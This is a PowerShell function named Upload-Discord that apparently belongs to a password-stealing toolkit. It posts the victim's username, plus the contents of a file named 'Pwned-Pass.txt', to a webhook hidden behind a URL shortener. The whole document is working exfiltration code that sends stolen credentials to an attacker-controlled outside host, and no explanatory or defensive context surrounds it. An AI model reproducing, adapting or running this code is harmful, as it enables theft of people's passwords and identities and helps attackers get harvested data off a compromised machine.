function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'https://tinyurl.com/3u67z8wa'
    $file = "Pwned-Pass.txt"  # Specify the file name here

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (Test-Path $file){
        $fileContent = Get-Content $file
        $Body['file1'] = $fileContent
        Invoke-RestMethod -Uri $hookurl -Method Post -Body $Body
    } else {
        Write-Host "File not found: $file"
    }
}
